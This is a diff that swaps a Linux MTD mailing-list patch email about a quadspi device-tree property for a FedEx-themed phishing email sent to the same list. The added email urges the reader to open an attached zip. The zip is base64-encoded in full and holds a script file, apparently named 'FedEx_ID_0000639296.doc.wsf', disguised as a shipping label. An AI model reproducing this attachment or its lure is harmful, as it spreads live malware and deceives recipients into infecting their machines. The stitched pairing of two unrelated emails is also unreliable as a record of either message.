@@ -1,16 +1,17 @@
-Received: from smtp2-g21.free.fr ([212.27.42.2])
- by bombadil.infradead.org with esmtps (Exim 4.85_2 #1 (Red Hat Linux))
- id 1bolRR-0002Yu-7i
- for linux-mtd@lists.infradead.org; Tue, 27 Sep 2016 06:00:34 +0000
-From: "Albert ARIBAUD (3ADEV)" <albert.aribaud@3adev.fr>
+Received: from vps0.pedrorozenkraft.cz ([83.167.228.97]
+ helo=vps.pedrorozenkraft.cz)
+ by merlin.infradead.org with esmtp (Exim 4.85_2 #1 (Red Hat Linux))
+ id 1boxpz-0000Qj-Sl
+ for linux-mtd@lists.infradead.org; Tue, 27 Sep 2016 19:14:44 +0000
 To: linux-mtd@lists.infradead.org
-Cc: devicetree@vger.kernel.org,
-	Han Xu <han.xu@nxp.com>
-Subject: [PATCH 2/2] fsl-quadspi: introduce per-bus spi-bus-width property
-Date: Tue, 27 Sep 2016 07:59:57 +0200
-Message-Id: <20160927055957.427-2-albert.aribaud@3adev.fr>
-In-Reply-To: <20160927055957.427-1-albert.aribaud@3adev.fr>
-References: <20160927055957.427-1-albert.aribaud@3adev.fr>
+Subject: Problem with parcel shipping, ID:0000639296
+Date: Tue, 27 Sep 2016 21:13:53 +0200
+From: "FedEx International Ground" <james.haney@wp.pedrorozenkraft.cz>
+Reply-To: "FedEx International Ground" <james.haney@wp.pedrorozenkraft.cz>
+Message-ID: <7aeb823fd04b253c33da959c97aafedc@wp.pedrorozenkraft.cz>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1_d9f17f4876e2018d3860ae248b283dfd"
+Content-Transfer-Encoding: 8bit
 List-Id: Linux MTD discussion mailing list <linux-mtd.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=unsubscribe>
@@ -20,49 +21,191 @@ List-Help: <mailto:linux-mtd-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=subscribe>
 
-Introduce spi-bus-width property for bus subnodes, to
-specify per-bus capability to use NORMAL, FAST, DUAL,
-and/or QUAD reads.
 
-Signed-off-by: Albert ARIBAUD (3ADEV) <albert.aribaud@3adev.fr>
----
- Documentation/devicetree/bindings/mtd/fsl-quadspi.txt | 18 ++++++++++++++++++
- 1 file changed, 18 insertions(+)
+--b1_d9f17f4876e2018d3860ae248b283dfd
+Content-Type: text/plain; charset=us-ascii
 
-diff --git a/Documentation/devicetree/bindings/mtd/fsl-quadspi.txt b/Documentation/devicetree/bindings/mtd/fsl-quadspi.txt
-index c34aa6f..82e4eb8 100644
---- a/Documentation/devicetree/bindings/mtd/fsl-quadspi.txt
-+++ b/Documentation/devicetree/bindings/mtd/fsl-quadspi.txt
-@@ -24,6 +24,17 @@ Optional properties:
- 			      (Please check the board's schematic.)
-   - big-endian : That means the IP register is big endian
- 
-+Required subnode properties:
-+  - spi-max-frequency: maximum operating frequency of the SPI device.
-+                       The controller will run at the lowest of all
-+                       specified frequencies (or at the default of 66 MHz).
-+
-+Optional subnode properties:
-+  - spi-bus-width: if present, specifies how the decide should be read.
-+                   1 specifies FAST read, 2 specifies DUAL read, and 4
-+                   specifies QUAD read.
-+                   If absent, normal (non-FAST) reads are used.
-+
- Example:
- 
- qspi0: quadspi@40044000 {
-@@ -37,5 +48,12 @@ qspi0: quadspi@40044000 {
- 
- 	flash0: s25fl128s@0 {
- 		....
-+		spi-max-frequency = <66000000>;
-+		spi-bus-width = <2>;
-+	};
-+	flash1: s25fl128s@1 {
-+		....
-+		spi-max-frequency = <88000000>;
-+		spi-bus-width = <4>;
- 	};
- };
--- 
-2.9.3
+Dear Customer,
+
+
+
+This is to confirm that one or more of your parcels has been shipped.
+
+Please, open email attachment to print shipment label.
+
+
+
+Yours sincerely,
+
+James Haney,
+
+Sr. Station Agent.
+
+
+--b1_d9f17f4876e2018d3860ae248b283dfd
+Content-Type: application/zip; name="FedEx_ID_0000639296.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=FedEx_ID_0000639296.zip
+
+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
+
+
+--b1_d9f17f4876e2018d3860ae248b283dfd--
